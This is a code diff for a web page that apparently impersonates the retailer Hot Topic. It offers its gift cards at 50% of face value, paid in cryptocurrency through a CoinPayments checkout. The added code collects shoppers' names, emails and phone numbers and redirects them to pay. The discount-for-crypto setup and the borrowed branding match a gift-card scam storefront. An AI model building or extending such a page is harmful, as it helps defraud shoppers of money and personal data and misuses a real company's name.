@@ -8,6 +8,7 @@ import DeliveryMethodSelector from "@/components/DeliveryMethodSelector";
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicPromo from "@/components/HotTopicPromo";
 import HotTopicFooter from "@/components/HotTopicFooter";
+import { createCoinPaymentTransaction } from "@/integrations/coinpayments/client";
 import { AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users } from "lucide-react";
 
 const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
@@ -95,7 +96,7 @@ const Index = () => {
     }));
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!selectedAmount) {
@@ -137,27 +138,53 @@ const Index = () => {
       return;
     }
     
-    // Show success message (in a real app, this would submit to a backend)
+    // Set loading state
     setIsSubmitting(true);
-    setTimeout(() => {
+    
+    try {
+      // Calculate the discounted amount (50% of the selected gift card value)
+      const paymentAmount = selectedAmount * 0.5;
+      
+      // Create CoinPayment transaction
+      const paymentResult = await createCoinPaymentTransaction({
+        amount: paymentAmount,
+        customerName: `${formData.firstName} ${formData.lastName}`,
+        customerEmail: formData.email,
+        giftCardValue: selectedAmount,
+      });
+      
+      if (!paymentResult.success) {
+        toast({
+          title: "Payment Error",
+          description: paymentResult.error || "There was an error processing your payment",
+          variant: "destructive",
+        });
+        setIsSubmitting(false);
+        return;
+      }
+      
+      // Save order details to localStorage for reference
+      localStorage.setItem("hotTopicOrder", JSON.stringify({
+        customerName: `${formData.firstName} ${formData.lastName}`,
+        email: formData.email,
+        phone: formData.phone,
+        giftCardValue: selectedAmount,
+        paymentAmount: paymentAmount,
+        deliveryMethod: deliveryMethod,
+        orderDate: new Date().toISOString(),
+      }));
+      
+      // Redirect to CoinPayments checkout page
+      window.location.href = paymentResult.checkoutUrl as string;
+    } catch (error) {
+      console.error("Payment submission error:", error);
       toast({
-        title: "Order submitted successfully!",
-        description: `Your $${selectedAmount} Hot Topic gift card will be ${deliveryMethod === "e-gift" ? "emailed to you shortly" : "shipped to your address"}`,
+        title: "System Error",
+        description: "We encountered a technical issue. Please try again later.",
+        variant: "destructive",
       });
       setIsSubmitting(false);
-      // Reset form after successful submission
-      setFormData({
-        firstName: "",
-        lastName: "",
-        email: "",
-        phone: "",
-        address: "",
-        city: "",
-        state: "",
-        zipCode: "",
-      });
-      setSelectedAmount(null);
-    }, 1500);
+    }
   };
 
   const renderErrorMessage = (fieldName: string) => {
